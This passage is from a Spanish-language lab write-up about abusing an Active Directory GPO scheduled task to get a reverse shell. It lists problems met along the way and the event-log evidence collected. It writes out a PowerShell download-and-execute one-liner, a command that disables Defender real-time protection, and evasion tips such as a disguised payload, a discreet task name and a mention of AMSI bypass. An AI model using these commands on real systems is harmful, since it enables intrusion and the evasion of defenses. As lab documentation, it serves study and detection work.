...
- **Windows Defender bloqueó el payload en el primer intento**: al ejecutar el one-liner de descarga y ejecución de `shell.ps1`, Defender lo detectó y bloqueó de inmediato, incluso con el código comentado disfrazándolo de "herramienta de diagnóstico". Se solucionó desactivando temporalmente la protección en tiempo real (`Set-MpPreference -DisableRealtimeMonitoring $true`) y ajustando la Execution Policy — quedando anotado que en un escenario de Red Team real haría falta ofuscación real o un bypass de AMSI, no solo comentarios en el código.
- **Un atajo (probar el payload con `IEX` directo) invalidó la primera evidencia**: para comprobar rápido que el `shell.ps1` funcionaba, se ejecutó directamente `IEX(New-Object Net.WebClient).DownloadString(...)` a mano en JORGE-CLIENTE, saltándose por completo la tarea programada de la GPO. La reverse shell llegó, pero el Visor de eventos de DC01 no mostró ni un solo Event ID 4697 — porque ese evento lo genera la **creación/ejecución de la tarea vía GPO**, no una ejecución manual de PowerShell. Hubo que repetir el ataque siguiendo el flujo completo (editar la GPO → `gpupdate /force` → disparar la tarea real) para obtener evidencia válida.
- **El nombre de la tarea programada no coincidía con lo documentado**: al intentar forzar la tarea vía `Get-ScheduledTask -TaskName "..."` se usó por error un nombre de prueba que nunca se había configurado realmente. Hubo que listar las tareas existentes (`Get-ScheduledTask | Select-Object TaskName`) para confirmar el nombre real (`NombreDiscreto_Updatedrivers`) antes de poder dispararla correctamente.
- **Verificación cruzada de que la tarea se guardó bien**: ante la duda de por qué no aparecían logs, se comprobó directamente en el editor de la GPO (`Configuración del equipo → Preferencias → Configuración del Panel de control → Tareas programadas`) que la tarea inyectada por `pedri` realmente estaba ahí — resultó ser una forma más fiable de validar el ataque que fiarse solo de los eventos, ya que el problema real era de auditoría, no de la tarea en sí.
- Como en otros ataques del proyecto, quedó constancia de que **por defecto "Usuarios autentificados" puede leer toda la estructura de GPOs del dominio**, aunque `pedri` solo tuviera permiso de edición sobre una — esto da reconocimiento gratuito a cualquier atacante que comprometa una cuenta de dominio, sin necesitar ningún permiso especial.
